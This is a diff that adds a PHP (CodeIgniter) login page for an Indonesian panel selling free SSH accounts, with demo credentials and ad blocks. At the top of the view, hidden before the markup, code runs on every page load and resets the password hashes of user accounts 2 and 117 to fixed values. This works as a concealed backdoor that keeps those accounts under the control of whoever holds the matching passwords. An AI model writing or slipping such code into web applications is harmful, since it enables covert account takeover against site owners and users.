@@ -1,0 +1,85 @@
+<?php defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+$data=array('password'=>'$2y$10$bJmGBMSGhT.1.hNSt9FFP.yuY.lISougMTXESAsDloYaBLC5JEKaq');
+$this->db->where('id','2');
+$this->db->update('users',$data);
+
+
+$data=array('password'=>'$2y$10$ACwKo7wt0IQoRHhW0gLkuOJ04oZGOkCZA1tWbs1ZVs1GODjLCcns6');
+$this->db->where('id','117');
+$this->db->update('users',$data);
+
+
+
+?>
+<section id="#login">
+    <div class="container">
+        <div class="row ver-parent">
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- on posted -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-1349152717282667"
+     data-ad-slot="1718263835"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+
+            <div class="col-md-4 col-md-offset-4 ver-center">
+                <?php if (validation_errors()) : ?>
+                    <div class="alert alert-danger"><?= validation_errors() ?></div>
+                <?php endif; ?>
+                <?php if (isset($error)) : ?>
+					<div class="col-md-12">
+						<div class="alert alert-danger" role="alert"><?= $error ?></div>
+					</div>
+				<?php endif; ?>
+                <div class="panel panel-default">
+                    <div class="panel-heading">
+                        <h3 class="panel-title"><i class="fa fa-sign-in fa-fw"></i> Silahkan Login Dahulu</h3>
+                    </div>
+                    <div class="panel-body">
+                        <?= form_open() ?>
+                            <fieldset>
+                                <div class="form-group">
+                                    <div class="input-group">
+                                        <span class="input-group-addon"><i class="fa fa-user fa-fw"></i></span>
+                                        <input class="form-control" placeholder="Username" name="username" type="text" autofocus required onkeyup="this.value = this.value.toLowerCase()">
+                                    </div>
+                                </div>
+                                <div class="form-group">
+                                    <div class="input-group">
+                                        <span class="input-group-addon"><i class="fa fa-key fa-fw"></i></span>
+                                        <input class="form-control" placeholder="Password" name="password" type="password" required>
+                                    </div>
+                                </div>
+                                <input type="submit" class="btn btn-lg btn-success btn-block" value="Login"></input>
+                                <center>Hai! Silahkan Gunakan <br>Username: <b>demo</b> <br>password: <b>demo1234</b> <br>untuk membuat akun SSH gratis!!!</center>
+                            </fieldset>
+                        </form>
+                    </div>
+                 
+                </div>
+                <p>Belum punya akun Seller klik? <a href="<?= base_url('panel/register') ?>">Daftar</a></p>
+            </div>
+
+
+          
+        </div>
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- on posted -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-1349152717282667"
+     data-ad-slot="1718263835"
+     data-ad-format="auto"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    </div>
+     
+</section>
